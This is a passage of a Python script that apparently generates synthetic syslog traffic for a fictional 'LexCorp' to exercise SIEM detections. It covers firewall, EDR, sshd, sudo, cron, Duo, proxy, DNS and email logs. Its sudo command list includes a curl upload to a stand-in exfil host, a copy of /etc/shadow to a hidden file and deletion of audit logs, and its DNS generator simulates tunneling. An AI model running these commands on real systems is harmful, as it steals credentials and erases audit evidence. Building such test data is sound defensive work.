# scenarios below.
EDR_ENDPOINTS = {
    # hostname -> os  (reuses existing WIN_HOSTS/INTERNAL_HOSTS as the same
    # machines' EDR agent, plus a couple of analyst laptops for osx coverage)
    "NEXUS-CORE-DC01": "windows", "AVENGERS-DB01": "windows",
    "WAKANDA-CTRL01": "windows", "XMEN-CTRL01": "windows",
    "JLEAGUE-GOTHAM-HQ01": "windows", "OPS-DMZ-GW01": "windows",
    "station-wakanda-01.lexcorp.com": "linux", "outpost-detroit-mi.lexcorp.com": "linux",
    "station-gotham-01.lexcorp.com": "linux", "avengers-db01.lexcorp.com": "linux",
    "n-fury-mbp.lexcorp.com": "osx", "a-waller-mbp.lexcorp.com": "osx",
}
EDR_AGENT_VERSION = "23.4.2.10"
EDR_SIGNED_PUBLISHERS = ["Microsoft Corporation", "Microsoft Windows", "Google LLC", "Apple Inc."]
EDR_BENIGN_PROCS = [
    # (parent_name, parent_cmdline, child_name, child_cmdline, publisher)
    ("explorer.exe", "C:\\Windows\\explorer.exe", "chrome.exe", "chrome.exe --profile-directory=Default", "Google LLC"),
    ("services.exe", "C:\\Windows\\System32\\services.exe", "svchost.exe", "svchost.exe -k netsvcs -p", "Microsoft Corporation"),
    ("bash", "-bash", "curl", "curl -s https://update.googleapis.com/service/update2", "Google LLC"),
    ("bash", "-bash", "git", "git fetch origin main", "Microsoft Corporation"),
    ("launchd", "/sbin/launchd", "softwareupdated", "/usr/libexec/softwareupdated", "Apple Inc."),
    ("powershell.exe", "powershell.exe -NoProfile", "Get-Process", "Get-Process | Where-Object {$_.CPU -gt 10}", "Microsoft Corporation"),
]

# LexCorp Inc.-plausible destination ports
SENSITIVE_PORTS = {
    22:   "SSH",
    443:  "HTTPS",
    8443: "MGMT-HTTPS",
    5060: "SIP",
    1194: "OpenVPN",
    4500: "IKE-NAT-T",
    500:  "IKE",
    1433: "MSSQL",
    5432: "PostgreSQL",
    6379: "Redis",
    8080: "HTTP-ALT",
    9200: "Elasticsearch",
    2222: "SSH-ALT",
}

PANW_FIREWALLS = [
    {"host": "nexus-core-fw01.lexcorp.com",            "ip": "10.0.0.1"},
    {"host": "station-metropolis-01.lexcorp.com",      "ip": "10.1.0.1"},
    {"host": "station-lasvegas-01.lexcorp.com",     "ip": "10.2.0.1"},
    {"host": "station-oa-01.lexcorp.com", "ip": "10.3.0.1"},
    {"host": "station-gotham-01.lexcorp.com", "ip": "10.4.0.1"},
    {"host": "station-belle-reve-01.lexcorp.com",   "ip": "10.5.0.1"},
    {"host": "ops-dmz-gw01.lexcorp.com",            "ip": "172.16.0.1"},
    {"host": "noc-ids01.lexcorp.com",               "ip": "10.0.10.5"},
    {"host": "station-wakanda-01.lexcorp.com",    "ip": "10.6.0.1"},
    {"host": "station-wyandanch-01.lexcorp.com",    "ip": "10.7.0.1"},
    {"host": "station-deerpark-01.lexcorp.com",     "ip": "10.8.0.1"},
    {"host": "station-uniondale-01.lexcorp.com",    "ip": "10.9.0.1"},
    {"host": "station-detroit-01.lexcorp.com",      "ip": "10.10.0.1"},
    {"host": "station-atlanta-01.lexcorp.com",      "ip": "10.11.0.1"},
    {"host": "outpost-detroit-mi.lexcorp.com",      "ip": "10.12.0.1"},
]

# App-ID names for ordinary ambient traffic (PAN-OS's real "app" field).
PANW_APPS_BENIGN = ["ssl", "web-browsing", "dns", "ms-office365", "google-base", "ssh", "ntp"]

# Named Marvel/DC-universe Threat-log signatures used inside scripted
# scenarios (sub_type=vulnerability is PAN-OS's real Threat-log subtype for a
# custom/fictional IPS signature hit -- see _panw_event).
PANW_NARRATIVE_SIGNATURES = {
    "beacon":  "Rival Faction Network Beacon Detected",
    "exfil":   "Cosmic Cube Vault Exfiltration Signature",
    "insider": "Insider Leak Pattern - Rogue Agent Signature",
    "sprawl":  "Solo Op Credential Sprawl Signature",
    "trust":   "Excessive Alliance Trust Signature",
    "recon":   "Independent Cell Recon Signature",
}

# Generic (non-narrative) threat names for ordinary ambient Threat-log hits --
# these are properly caught/blocked, same secure-by-default philosophy as
# every other source (see the AWS CloudTrail / SentinelOne EDR comments above).
PANW_AMBIENT_THREATS = [
    ("virus", "malware", "Generic.Trojan.Agent", "high"),
    ("url", "malware", None, "medium"),
    ("vulnerability", None, "Suspicious Port Scan Activity", "medium"),
]

HTTP_PATHS = [
    # Financial / registry / vault systems
    "/api/v2/registry/avengers/power",
    "/api/v2/registry/jleague/power",
    "/api/v2/vault/avengers/cosmic",
    "/api/v2/vault/xmen/solo-ops",
    "/secure/operative-registry",
    "/ops/doom/vendor-status",
    "/ops/wakanda/infra-standup",
    # Roster / personnel lookups
    "/intel/db/search?q=stark+tony",
    "/intel/db/search?q=rogers+steve",
    "/intel/db/search?q=wayne+bruce",
    "/intel/db/search?q=jordan+hal",
    "/intel/db/passport?alias=iron.man",
    "/intel/db/passport?alias=batman",
    # Historical archive — real, well-documented factional disputes
    "/intel/archive/civil-war-accords-2016",
    "/intel/archive/hydra-founding-1945",
    # Insider / audit
    "/audit/jleague/financial-review",
    "/admin/purge-logs",
    "/ops/access/termination-request",
    "/healthz",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "LexCorp-Classified-Client/3.2 (+https://intranet.lexcorp.com/)",
    "PowerRegistryConsole/1.8 Python/3.11",
    "InfraStandupTool/4.0 (LexCorp)",
    "VaultSync/0.9 (do-not-log)",
    "curl/8.1.2",
    "Wget/1.21.4",
]

# ─── Syslog RFC 5424 helpers ───────────────────────────────────────────────────

def pri(facility: int, severity: int) -> int:
    return facility * 8 + severity

def rfc5424(severity: int, facility: int, hostname: str, appname: str,
            procid: str, msgid: str, message: str) -> str:
    """Build an RFC 5424 syslog frame (no structured-data for simplicity)."""
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    priority = pri(facility, severity)
    header = f"<{priority}>1 {ts} {hostname} {appname} {procid} {msgid} -"
    raw = f"{header} {message}"
    # RFC 6587 octet-counting framing: "<len> <msg>" with NO trailing delimiter.
    # A trailing newline would desync the strict syslog() source's frame parser.
    return f"{len(raw.encode())} {raw}"

# ─── Log generators ────────────────────────────────────────────────────────────

def _panw_event(log_type: str, *, src_ip: str = None, dst_ip: str = None, dst_port: int = None,
                 app: str = None, action: str = None, user: str = None, rule: str = None,
                 sub_type: str = None, threat_name: str = None, threat_category: str = None,
                 url_category: str = None, severity: str = None,
                 config_result: str = None, admin: str = None, cmd: str = None, path: str = None,
                 stage: str = None, status: str = None, region: str = None,
                 bytes_sent: int = None, bytes_received: int = None) -> dict:
    """Build a Palo Alto Networks Firewall (PAN-OS) event. Field names grounded
    in this tenant's own 16 deployed Palo Alto-sourced rules (data/extracted.json):
    metadata.log_name (TRAFFIC/THREAT), activity_name=GLOBALPROTECT, app_name,
    action + unmapped.action, unmapped.sub_type (virus/url/vulnerability),
    unmapped.threat_category/url_category, unmapped.severity, dst_endpoint.ip/port,
    src_endpoint.ip/location.region, unmapped.type=CONFIG/unmapped.result. This
    replaces the earlier Cisco ASA/FTD-shaped events, whose text format didn't
    match any of this tenant's real Cisco FTD rules at all."""
    now = datetime.now(timezone.utc)
    event: dict = {"time_generated": now.strftime("%Y-%m-%dT%H:%M:%SZ")}

    if log_type == "GLOBALPROTECT":
        event["activity_name"] = "GLOBALPROTECT"
        event["unmapped"] = {"stage": stage or "login"}
        event["status"] = status or "success"
        if user: event["user"] = {"name": user}
        if src_ip or region:
            event["src_endpoint"] = {}
            if src_ip: event["src_endpoint"]["ip"] = src_ip
            if region: event["src_endpoint"]["location"] = {"region": region}
        return event

    if log_type == "CONFIG":
        event["unmapped"] = {"type": "CONFIG", "result": config_result or "Succeeded"}
        if admin: event["unmapped"]["admin"] = admin
        if cmd: event["unmapped"]["cmd"] = cmd
        if path: event["unmapped"]["path"] = path
        return event

    # TRAFFIC / THREAT share the connection-log shape.
    event["metadata"] = {"log_name": log_type}
    unmapped: dict = {}
    if app: event["app_name"] = app
    if action:
        event["action"] = action
        unmapped["action"] = action
    if rule: unmapped["rule"] = rule
    if src_ip or region:
        event["src_endpoint"] = {}
        if src_ip: event["src_endpoint"]["ip"] = src_ip
        if region: event["src_endpoint"]["location"] = {"region": region}
    if dst_ip or dst_port:
        event["dst_endpoint"] = {}
        if dst_ip: event["dst_endpoint"]["ip"] = dst_ip
        if dst_port: event["dst_endpoint"]["port"] = dst_port
    if user: event["user"] = {"name": user}

    if log_type == "TRAFFIC":
        if bytes_sent is not None or bytes_received is not None:
            event["traffic"] = {"bytes_out": bytes_sent or 0, "bytes_in": bytes_received or 0}
    elif log_type == "THREAT":
        if sub_type: unmapped["sub_type"] = sub_type
        if threat_category: unmapped["threat_category"] = threat_category
        if url_category: unmapped["url_category"] = url_category
        if severity: unmapped["severity"] = severity
        if threat_name: event["threat"] = {"name": threat_name}

    if unmapped:
        event["unmapped"] = unmapped
    return event

def _panw_line(host: str, event: dict, sev: int = 6) -> str:
    return rfc5424(sev, 23, host, "panw", str(random.randint(1000, 9999)), "PANW",
                   json.dumps(event, separators=(",", ":")))

def gen_panw_traffic() -> str:
    """Ambient PAN-OS Traffic log -- ordinary allowed connections."""
    fw  = random.choice(PANW_FIREWALLS)
    op  = random.choice(OPERATIVES)
    src = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    port_num, _svc = random.choice(list(SENSITIVE_PORTS.items()))
    event = _panw_event("TRAFFIC", src_ip=src, dst_ip=dst, dst_port=port_num,
                         app=random.choice(PANW_APPS_BENIGN), action="allow",
                         user=op["name"], rule="allow-outbound",
                         bytes_sent=random.randint(256, 500_000),
                         bytes_received=random.randint(512, 2_000_000))
    return _panw_line(fw["host"], event)

def gen_panw_deny() -> str:
    """Ambient PAN-OS Traffic log -- policy denies, not a threat signature hit."""
    fw  = random.choice(PANW_FIREWALLS)
    src = random.choice(EXTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    port_num, _svc = random.choice(list(SENSITIVE_PORTS.items()))
    event = _panw_event("TRAFFIC", src_ip=src, dst_ip=dst, dst_port=port_num,
                         app=random.choice(PANW_APPS_BENIGN), action="deny",
                         rule="deny-inbound")
    return _panw_line(fw["host"], event, sev=4)

def gen_panw_globalprotect() -> str:
    """Ambient PAN-OS GlobalProtect VPN login -- always MFA'd, always succeeds."""
    fw  = random.choice(PANW_FIREWALLS)
    op  = random.choice(OPERATIVES)
    src = random.choice(EXTERNAL_IPS)
    geo = IP_GEO.get(src, {"country": "Unknown"})
    event = _panw_event("GLOBALPROTECT", user=op["alias"], src_ip=src,
                         stage="login", status="success", region=geo["country"])
    return _panw_line(fw["host"], event)

def gen_panw_threat() -> str:
    """Ambient PAN-OS Threat log -- generic malware/vulnerability hits, always
    caught (action=deny/reset/block). Named Watchtower-universe signatures
    only appear inside the dedicated scripted scenarios, not here."""
    fw  = random.choice(PANW_FIREWALLS)
    src = random.choice(EXTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    sub_type, category, name, severity = random.choice(PANW_AMBIENT_THREATS)
    event = _panw_event("THREAT", src_ip=src, dst_ip=dst,
                         app=random.choice(PANW_APPS_BENIGN),
                         action=random.choice(["reset", "block", "drop"]),
                         sub_type=sub_type,
                         threat_category=category if sub_type == "virus" else None,
                         url_category=category if sub_type == "url" else None,
                         threat_name=name, severity=severity)
    return _panw_line(fw["host"], event, sev=4)

def _panw_ids_line(host: str, threat_name: str, src_ip: str, dst_ip: str, sev: int = 2) -> str:
    """Scenario-only Threat log hit for a named Watchtower-universe signature
    (PAN-OS's real sub_type=vulnerability -- a custom/fictional IPS signature)."""
    event = _panw_event("THREAT", src_ip=src_ip, dst_ip=dst_ip, action="allow",
                         sub_type="vulnerability", threat_name=threat_name, severity="critical")
    return _panw_line(host, event, sev=sev)

def _panw_traffic_line(host: str, src_ip: str, dst_ip: str, dst_port: int, app: str,
                        action: str = "allow", sev: int = 6) -> str:
    event = _panw_event("TRAFFIC", src_ip=src_ip, dst_ip=dst_ip, dst_port=dst_port,
                         app=app, action=action)
    return _panw_line(host, event, sev=sev)

def _panw_vpn_line(host: str, user: str, ip: str, sev: int = 6) -> str:
    geo = IP_GEO.get(ip, {"country": "Unknown"})
    event = _panw_event("GLOBALPROTECT", user=user, src_ip=ip, stage="login",
                         status="success", region=geo["country"])
    return _panw_line(host, event, sev=sev)

def gen_ssh_auth() -> str:
    """Linux sshd auth log (PAM / OpenSSH format)."""
    host = random.choice(INTERNAL_HOSTS)
    op   = random.choice(OPERATIVES)
    src  = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
    pid  = str(random.randint(10000, 65535))
    success = random.random() > 0.25
    if success:
        msg = (
            f"Accepted publickey for {op['name']} from {src} port {random.randint(49152,65535)} "
            f"ssh2: RSA SHA256:{_fake_sha256()}"
        )
        sev = 6
    else:
        msg = (
            f"Failed password for invalid user {op['alias']} from {src} "
            f"port {random.randint(49152,65535)} ssh2"
        )
        sev = 4
    return rfc5424(sev, 4, host, "sshd", pid, "SSHD", msg)

def gen_sudo_event() -> str:
    """Linux sudo usage log."""
    host = random.choice(INTERNAL_HOSTS)
    op   = random.choice(OPERATIVES)
    cmds = [
        "/usr/bin/tail -f /var/log/deathrow/ledger.log",
        "/bin/rm -rf /var/log/badboy/audit/",
        "/usr/sbin/tcpdump -i eth0 -w /tmp/cap.pcap",
        "/usr/bin/gpg --decrypt /opt/wutang/solo-deals.enc",
        "/usr/bin/openssl s_client -connect nexus-core-dc01.lexcorp.com:443",
        "/sbin/reboot",
        "/usr/bin/curl -s http://exfil.example.com/upload",
        "/bin/cp /etc/shadow /tmp/.hidden_s",
        # Avengers Civil War access-revocation split (Sokovia Accords fallout)
        "/opt/avengers/bin/revoke_access.sh --label accords --reason DISTRIBUTION-SPLIT",
        "/usr/bin/shred -u /intel/archive/power-registry-full.tar.gz",
        "/opt/wakanda/bin/rotate_legal_creds.sh --op CONTRACT-DISPUTE",
        # HYDRA defector rotating credentials off a compromised identity
        "/opt/hydra/bin/rotate_creds.py --from hydra --to avengers",
        # Cosmic Cube vault exfil — unreleased assets
        "/usr/bin/grep -r 'unreleased assets' /intel/vault/avengers/",
        # Justice League financial audit
        "/opt/jleague/bin/audit_export.sh --scope financial --year 1997",
        # X-Men individually-run solo ops
        "/opt/xmen/bin/solo_op_sync.sh --member all",
        "/usr/bin/last -ai | grep 23.243.10.90",
    ]
    cmd  = random.choice(cmds)
    tty  = f"pts/{random.randint(0,5)}"
    pid  = str(random.randint(10000, 65535))
    msg  = (
        f"{op['name']} : TTY={tty} ; PWD=/root ; USER=root ; COMMAND={cmd}"
    )
    return rfc5424(5, 10, host, "sudo", pid, "SUDO", msg)

def gen_pam_session() -> str:
    """Linux PAM session open/close."""
    host   = random.choice(INTERNAL_HOSTS)
    op     = random.choice(OPERATIVES)
    action = random.choice(["opened", "closed"])
    pid    = str(random.randint(10000, 65535))
    svc    = random.choice(["sshd", "login", "su", "sudo"])
    msg    = f"pam_unix({svc}:session): session {action} for user {op['name']} by (uid=0)"
    return rfc5424(6, 10, host, "PAM", pid, "PAM", msg)

def gen_apache_access() -> str:
    """Apache Combined Log Format wrapped in syslog."""
    host      = random.choice(INTERNAL_HOSTS)
    src       = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
    op        = random.choice(OPERATIVES)
    path      = random.choice(HTTP_PATHS)
    ua        = random.choice(USER_AGENTS)
    method    = random.choice(["GET", "POST", "PUT", "DELETE", "OPTIONS"])
    statuses  = [200]*6 + [201, 204, 301, 302, 400, 401, 403, 404, 500, 503]
    status    = random.choice(statuses)
    size      = random.randint(200, 150_000)
    pid       = str(random.randint(1000, 9999))
    # Apache combined log format
    ts_apache = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    clf = (
        f'{src} - {op["name"]} [{ts_apache}] '
        f'"{method} {path} HTTP/1.1" {status} {size} '
        f'"-" "{ua}"'
    )
    return rfc5424(6, 16, host, "apache2", pid, "HTTP", clf)

def gen_cron_job() -> str:
    """cron execution — scheduled LexCorp Inc. tasks."""
    host = random.choice(INTERNAL_HOSTS)
    pid  = str(random.randint(10000, 65535))
    jobs = [
        "root CMD (/opt/deathrow/bin/purge_burned_masters.sh)",
        "root CMD (/opt/badboy/bin/sweep_financial_audit.py --quiet)",
        "root CMD (/usr/local/bin/ledger_sync.sh --dest ops-dmz-gw01)",
        "root CMD (/opt/rocafella/bin/contract_monitor.py --id 8812)",
        "root CMD (/bin/bash /opt/wutang/rotate_solo_deal_creds.sh)",
        "root CMD (/opt/deathrow/bin/generate_cover_aliases.py --count 5)",
        "root CMD (/opt/aftermath/bin/credential_rotation_scheduler.py --program AFTERMATH)",
        "root CMD (/opt/rocafella/bin/infra_standup_scan.py --src wakanda-hq01)",
        "root CMD (/opt/citadel/bin/asset_checkin.sh --all-stations)",
        "root CMD (/opt/deathrow/bin/wire_transfer_intercept.py --grid vegas)",
        "root CMD (/usr/local/bin/wipe_surveillance_cache.sh --older-than 30d)",
        "root CMD (/opt/rocafella/bin/track_probe.py --src external)",
    ]
    msg = random.choice(jobs)
    return rfc5424(6, 9, host, "cron", pid, "CRON", msg)

def gen_kernel_audit() -> str:
    """Linux auditd / kernel netfilter drop."""
    host = random.choice(INTERNAL_HOSTS)
    src  = random.choice(EXTERNAL_IPS)
    dst  = random.choice(INTERNAL_IPS)
    port_num = random.choice(list(SENSITIVE_PORTS.keys()))
    mac  = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
    msg  = (
        f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC={mac} "
        f"SRC={src} DST={dst} LEN={random.randint(40,1500)} TOS=0x00 "
        f"PREC=0x00 TTL={random.randint(40,128)} ID={random.randint(1000,60000)} "
        f"DF PROTO=TCP SPT={random.randint(49152,65535)} DPT={port_num} "
        f"WINDOW={random.randint(1024,65535)} RES=0x00 SYN URGP=0"
    )
    return rfc5424(4, 0, host, "kernel", "-", "AUDIT", msg)

# Duo result → (reasons) weighted toward realistic distributions. The
# genuinely alert-worthy outcomes (fraud, anomalous push, untrusted
# endpoint/anonymous IP) are deliberately NOT in this pool -- see
# _DUO_RARE_OUTCOMES and DUO_RARE_CHANCE below for why and how they're
# gated instead. This pool is just the everyday noise: normal approvals
# and the boring, expected flavor of denial (user fumbled the prompt,
# didn't respond in time, locked out, wrong passcode, unenrolled).
_DUO_OUTCOMES = (
    [("success", "user_approved",        "duo_push")] * 10 +
    [("success", "valid_passcode",       "passcode")] * 4 +
    [("success", "phone_call_approved",  "phone_call")] * 1 +
    [("denied",  "user_mistake",         "duo_push")] * 2 +
    [("denied",  "no_response",          "duo_push")] * 2 +
    [("denied",  "locked_out",           "duo_push")] * 1 +
    [("denied",  "invalid_passcode",     "passcode")] * 1 +
    [("denied",  "deny_unenrolled_user", "duo_push")] * 1
)

# The alert-worthy Duo outcomes -- each one matches a real "Cisco Duo MFA
# Attempt Flagged as Fraudulent" / "...Authentication Attempt from
# Untrusted Endpoint"-style detection. Meant to page a SOC a couple times a
# day each, not constantly, so they're pulled out of _DUO_OUTCOMES entirely
# and gated independently (same DUO_ADMIN_PER_DAY-style pattern) rather
# than living in a pool that gets sampled thousands of times a day.
_DUO_RARE_OUTCOMES = (
    ("fraud",   "user_marked_fraud",       "duo_push"),
    ("denied",  "anomalous_push",          "duo_push"),
    ("success", "anonymous_ip",            "duo_push"),
    ("success", "endpoint_is_not_trusted", "duo_push"),
)
DUO_RARE_PER_DAY = float(os.getenv("DUO_RARE_PER_DAY", "3"))
DUO_RARE_CHANCE = DUO_RARE_PER_DAY / TICKS_PER_DAY

def gen_duo_auth(outcome: tuple | None = None) -> str:
    """Cisco Duo authentication log. Field names grounded in this tenant's
    real deployed Duo rules (status/status_detail/unmapped.event_type/
    unmapped.factor -- NOT the raw Admin API v2 top-level event_type/factor/
    reason/result shape used before, which none of those real rules matched).

    `outcome` lets a caller force a specific (result, reason, factor) tuple
    -- used by the DUO_RARE_CHANCE gate in send_logs() to occasionally emit
    one of _DUO_RARE_OUTCOMES through the same event-building code, rather
    than duplicating this whole function for four rare cases.
    """
    proxy   = random.choice(DUO_PROXIES)
    op      = random.choice(OPERATIVES)
    app     = random.choice(DUO_APPLICATIONS)
    src     = random.choice(EXTERNAL_IPS)
    geo     = IP_GEO.get(src, {"city": "Unknown", "state": "Unknown", "country": "Unknown"})
    result, reason, factor = outcome if outcome else random.choice(_DUO_OUTCOMES)

    now     = datetime.now(timezone.utc)
    txid    = "-".join(
        "".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)
    )

    event = {
        "access_device": {
            "ip": src,
            "location": {
                "city":    geo["city"],
                "state":   geo["state"],
                "country": geo["country"],
            },
            "browser":         random.choice(["Chrome", "Firefox", "Edge", "Safari"]),
            "browser_version": f"{random.randint(110,124)}.0",
            "os":              random.choice(["Windows", "Mac OS X", "Linux", "iOS", "Android"]),
            "os_version":      f"{random.randint(10,15)}.{random.randint(0,6)}",
        },
        "application": {
            "name": app,
            "key":  "DI" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18)),
        },
        "auth_device": {
            "ip":       src,
            "location": {
                "city":    geo["city"],
                "state":   geo["state"],
                "country": geo["country"],
            },
            "name": f"+1 555-{random.randint(100,999)}-{random.randint(1000,9999)}",
        },
        "status":        result,
        "status_detail": reason,
        "unmapped": {"event_type": "authentication", "factor": factor},
        # Duo's native epoch field is `timestamp`, but that collides with the
        # HEC envelope's reserved `timestamp` when DataPipeline root-merges the
        # parsed JSON (string-vs-int type conflict). Renamed to dodge the clash.
        "auth_timestamp": int(now.timestamp()),
        "isotimestamp": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+00:00",
        "txid":         txid,
        "user": {
            "name":   op["alias"],
            "key":    "DU" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18)),
            "groups": [op["clearance"]],
        },
        # Canonical corporate identity (matches Email recipient + Windows
        # TargetUserName) so cross-source identity correlations join. The cover
        # identity (alias) stays in user.name above for flavor.
        "email": f"{op['name']}@{email_domain(op['clearance'])}",
    }

    # Duo severity: fraud → alert(1), denied → warning(4), success → info(6)
    sev = {"fraud": 1, "denied": 4, "success": 6}[result]
    return rfc5424(sev, 13, proxy, "duo", "-", "DUO", json.dumps(event, separators=(",", ":")))

def gen_duo_admin() -> str:
    """Cisco Duo Administrator log event -- ordinary admin-console housekeeping
    (password resets, policy/group edits, hardware tokens). This is a distinct
    real Duo log type (unmapped.eventtype=administrator) that was missing
    entirely before; ambient actions here are routine, not suspicious."""
    proxy = random.choice(DUO_PROXIES)
    admin = random.choice(DUO_ADMINS)
    action, description, sev = random.choice(DUO_ADMIN_ACTIONS)
    now = datetime.now(timezone.utc)
    event = {
        "unmapped": {"eventtype": "administrator", "action": action, "description": description},
        "user": {"name": admin},
        "isotimestamp": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+00:00",
        "email": f"{admin}@lexcorp.com",
    }
    return rfc5424(sev, 13, proxy, "duo", "-", "DUO", json.dumps(event, separators=(",", ":")))

def gen_web_proxy() -> str:
    """Ambient Zscaler Internet Access traffic (JSON). Suspicious
    destinations are properly blocked/IPS-reset almost every time -- an
    "Allowed" hit against a known-bad domain only shows up in dedicated
    exfil/C2 scenarios, not here."""
    proxy  = random.choice(WEB_PROXIES)
    client = random.choice(INTERNAL_IPS)
    op     = random.choice(OPERATIVES)

    suspicious = random.random() < 0.15
    url, _peer_ip, _ctype = random.choice(EGRESS_SUSPICIOUS if suspicious else EGRESS_BENIGN)
    hostname = url.split("://")[-1].split("/")[0]
    method = ("CONNECT" if url.startswith("https://") and random.random() < 0.7
              else random.choice(["GET", "GET", "GET", "POST"]))

    if suspicious:
        action = random.choice(["Blocked", "IPS Reset", "Drop"])  # caught almost every time
        event: dict = {
            "app_name": "Suspicious Web Activity",
            "action": action,
            "user": {"name": op["name"]},
            "client_ip": client,
            "http_request": {"method": method, "url": {"hostname": hostname, "categories": ["Suspicious Destinations"]}},
            "risk_details": "malicious",
            "bytes": random.randint(200, 800),
            "time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "malware": {"name": random.choice(["cobaltstrike", "unknown.rat", "generic.trojan"])},
            "unmapped": {"event": {"threatcat": random.choice(["botnets", "c2", "malware"])}},
        }
        sev = 4
    else:
        bytes_ = (random.randint(256, 6_000_000) if method in ("POST", "CONNECT")
                  else random.randint(256, 200_000))
        event = {
            "app_name": "Web Browsing",
            "action": "Allowed",
            "user": {"name": op["name"]},
            "client_ip": client,
            "http_request": {"method": method, "url": {"hostname": hostname, "categories": ["General Browsing"]}},
            "risk_details": "benign",
            "bytes": bytes_,
            "time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        }
        sev = 6
    return rfc5424(sev, 16, proxy, "zscaler", str(random.randint(1000, 9999)), "PROXY",
                   json.dumps(event, separators=(",", ":")))

def _b32(n: int) -> str:
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz234567", k=n))

def gen_dns_query() -> str:
    """ISC BIND query log (querylog format)."""
    host     = random.choice(["nexus-core-dc01.lexcorp.com", "ops-dmz-gw01.lexcorp.com", "noc-ids01.lexcorp.com"])
    client   = random.choice(INTERNAL_IPS)
    resolver = random.choice(DNS_RESOLVERS)
    r = random.random()
    if r < 0.15:
        # DNS tunneling — long base32 labels under an exfil domain
        domain = f"{_b32(20)}.{_b32(12)}.exfil.example.net"
        qtype  = random.choice(["TXT", "NULL"])
        sev    = 4
    elif r < 0.45:
        domain, qtype = random.choice(DNS_SUSPICIOUS)
        sev = 4
    else:
        domain, qtype = random.choice(DNS_BENIGN)
        sev = 6
    cid = hex(random.randint(0x100000, 0xFFFFFF))
    msg = (f"client @{cid} {client}#{random.randint(1024,65535)} ({domain}): "
           f"query: {domain} IN {qtype} +E(0) ({resolver})")
    return rfc5424(sev, 3, host, "named", str(random.randint(100,9999)), "DNS", msg)

def _mimecast_event(*, recipient: str, sender_name: str, sender: str, subject: str,
                     direction: str = "inbound", actor_invoked_by: str = "Entry Scan",
                     event_type: str | None = None, malicious: bool = False,
                     category: str | None = None, blocked: bool = False,
                     file_type: str | None = None, file_name: str | None = None,
                     url: str | None = None, rejected: bool = False) -> dict:
    """Build a Mimecast-shaped email-security event. Field names grounded in
    this tenant's own deployed Mimecast-sourced rules (see the comment above
    MIMECAST_MALICIOUS_CATEGORIES). `blocked` always sets a concrete
    unmapped.action value (hold/block/bounce vs none) rather than omitting
    the field, so detections can cleanly test for "malicious and NOT blocked"."""
    now = datetime.now(timezone.utc)
    event: dict = {
        "direction": direction,
        "actor": {"invoked_by": actor_invoked_by},
        "status_detail": "malicious" if malicious else "clean",
        "email": {"from": sender, "fromName": sender_name, "to": recipient, "subject": subject},
        "receivedTime": now.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "unmapped": {"route": direction, "action": [], "actions": [], "adminOverride": []},
    }
    actions = list(MIMECAST_BLOCK_ACTIONS) if blocked else ["none"]
    event["unmapped"]["action"] = actions
    event["unmapped"]["actions"] = actions
    event["unmapped"]["adminOverride"] = actions
    if event_type:
        # Flat dotted key, NOT a nested {"event": {...}} object -- "event" is
        # DataPipeline's own envelope-reserved key (the original HEC body
        # field, pre-rename to "message"), so a nested top-level "event"
        # object gets silently dropped on the way through. A literal
        # "event.type" string key sidesteps that collision entirely while
        # still landing as the real rule-matching attribute name.
        event["event.type"] = event_type
        if event_type == "TTP Impersonation Protection":
            event["unmapped"]["taggedMalicious"] = malicious
    if category:
        event["unmapped"]["category"] = category
    if file_type or file_name:
        event["file"] = {}
        if file_type: event["file"]["type"] = file_type
        if file_name:
            event["file"]["name"] = file_name
            event["unmapped"]["AttNames"] = [file_name]
        event["unmapped"]["actionTriggered"] = actions
    if url:
        event["url"] = {"address": url}
    if rejected:
        event["unmapped"]["Act"] = "Rej"
        event["api"] = {"response": {"message": "Invalid Recipient Address"}}
    return event

def _email_line(event: dict) -> str:
    sev = 4 if event.get("status_detail") == "malicious" else 6
    return rfc5424(sev, 13, "mimecast-relay01.lexcorp.com", "mimecast", "-", "EMAIL",
                   json.dumps(event, separators=(",", ":")))

def gen_email_threat() -> str:
    """Mimecast email-security gateway log (JSON). Mostly clean inbound
    business mail; phishing/malware that DOES appear is properly held or
    blocked -- genuinely undetected malicious mail only shows up in the
    dedicated scenarios (sc_insider_leak_icecube, sc_shield_internal_watchdog)."""
    op = random.choice(OPERATIVES)
    recipient = f"{op['name']}@{email_domain(op['clearance'])}"
    roll = random.random()

    if roll < 0.75:
        name, sender = random.choice(MIMECAST_BENIGN_SENDERS)
        event = _mimecast_event(recipient=recipient, sender_name=name, sender=sender,
                                 subject=random.choice(MIMECAST_BENIGN_SUBJECTS))
    elif roll < 0.90:
        name, sender = random.choice(PHISH_SENDERS)
        subject = random.choice(["ACTION REQUIRED: verify your account", "Invoice overdue", "Password expires today"])
        event = _mimecast_event(recipient=recipient, sender_name=name, sender=sender, subject=subject,
                                 malicious=True, category=random.choice(MIMECAST_MALICIOUS_CATEGORIES), blocked=True)
    elif roll < 0.97:
        name, sender = random.choice(PHISH_SENDERS)
        attachment = random.choice(PHISH_ATTACHMENTS)
        event = _mimecast_event(recipient=recipient, sender_name=name, sender=sender,
                                 subject="Please review the attached document",
                                 event_type="TTP Attachment Protection", malicious=True, blocked=True,
                                 file_type=attachment.rsplit(".", 1)[-1], file_name=attachment)
    else:
        event = _mimecast_event(recipient=recipient, sender_name="External", sender="unknown@example.net",
                                 subject="(clicked link)", actor_invoked_by="User Click", malicious=True,
